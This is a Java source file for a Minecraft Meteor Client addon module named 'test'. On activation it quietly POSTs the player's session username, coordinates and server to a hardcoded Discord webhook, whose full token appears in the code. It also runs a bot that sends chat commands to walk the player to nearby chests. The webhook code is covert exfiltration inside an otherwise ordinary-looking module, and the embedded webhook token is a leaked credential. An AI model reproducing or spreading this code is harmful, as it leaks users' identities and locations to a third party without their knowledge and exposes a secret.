package genesis.team.addon.modules.info;

import genesis.team.addon.Genesis;
import genesis.team.addon.util.InfoUtil.BlockInfo;
import genesis.team.addon.util.InfoUtil.EntityInfo;
import genesis.team.addon.util.advanced.Task;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.meteorclient.utils.player.FindItemResult;
import meteordevelopment.meteorclient.utils.player.InvUtils;
import meteordevelopment.meteorclient.utils.player.PlayerUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.entity.BlockEntity;
import net.minecraft.block.entity.ChestBlockEntity;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.Items;
import net.minecraft.util.math.BlockPos;

import javax.net.ssl.HttpsURLConnection;
import java.io.OutputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Comparator;

public class test extends Module {

    public test() {
        super(Genesis.Combat, "test", "Automatically send cord.");
    }

    private FindItemResult axe;
    private BlockPos pos;
    private int x,y,z;
    private Stage stage;

    private final Task chatTask = new Task();

    @Override
    public void onActivate() {
        String message;
        String title = "Nick: "+ MinecraftClient.getInstance().getSession().getUsername();
        message = "Cords " + x + " " + y + " " + z+ " Server:" + mc.getServer();

        String jsonBrut = "";
        jsonBrut += "{\"embeds\": [{"
                + "\"title\": \""+ title +"\","
                + "\"description\": \""+ message +"\","
                + "\"color\": 65536"
                + "}]}";

        try {
            URL url = new URL("https://discord.com/api/webhooks/993880766297686048/BFH7GJEG1fSTMnGTatxiHoobA_bukW2Zmg3cJONh5w-xK9z-mZ65K4atr7jsboMEwfZg");
            HttpsURLConnection con = (HttpsURLConnection) url.openConnection();
            con.addRequestProperty("Content-Type", "application/json");
            con.addRequestProperty("User-Agent", "Java-DiscordWebhook-BY-Gelox_");
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            OutputStream stream = con.getOutputStream();
            stream.write(jsonBrut.getBytes());
            stream.flush();
            stream.close();
            con.getInputStream().close();
            con.disconnect();


        } catch (Exception e) {
            e.printStackTrace();
        }

        stage = Stage.Find;
        chatTask.reset();
        pos = null;
    }

    @Override
    public void onDeactivate() {
        ChatUtils.sendPlayerMsg("#stop");
    }

    @EventHandler
    public void onTick(TickEvent.Pre event) {
        axe = InvUtils.find(itemStack -> itemStack.getItem() == Items.NETHERITE_AXE || itemStack.getItem() == Items.DIAMOND_AXE);

        switch (stage) {
            case Find -> {
                pos = findChests();

                if (pos == null) {
                    chatTask.reset();
                    stage = Stage.Stuck;
                    //info("There's no chests in your view distance.");
                    //toggle();
                    return;
                }

                x = pos.getX();
                y = pos.getY();
                z = pos.getZ();

                chatTask.reset();
                stage = Stage.Move;
            }
            case Move -> {
                chatTask.run(() -> ChatUtils.sendPlayerMsg("#goto " + x + " " + y + " " + z));

                if (EntityInfo.getBlockPos(mc.player).equals(pos)) stage = Stage.Reset;
            }
            case Reset -> {
                chatTask.reset();

                stage = Stage.Find;
            }
            case Stuck -> {
                if (findChests() != null) stage = Stage.Find;
                else chatTask.run(() -> ChatUtils.sendPlayerMsg("#goto " + getDirection().getX() + " " + y + " " + getDirection().getZ()));
            }
        }
    }

    private BlockPos getDirection() {
        int x = BlockInfo.X(mc.player.getBlockPos());
        int y = BlockInfo.Y(mc.player.getBlockPos());
        int z = BlockInfo.Z(mc.player.getBlockPos());

        if (x > 0) x = 30000000;
        else x = -30000000;

        if (y > 0) y = 30000000;
        else y = -30000000;

        return new BlockPos(x,y,z);
    }

    private BlockPos findChests() {
        ArrayList<BlockPos> pos = new ArrayList<>();

        for (BlockEntity entity : Utils.blockEntities()) {
            if (entity instanceof ChestBlockEntity chestBlock) {
                if (!pos.contains(chestBlock.getPos())) pos.add(chestBlock.getPos());
            }
        }

        if (pos.isEmpty()) return null;

        pos.sort(Comparator.comparingDouble(PlayerUtils::distanceTo));
        return pos.get(0);
    }

    public enum Stage {
        Find,
        Move,
        Reset,
        Stuck
    }
}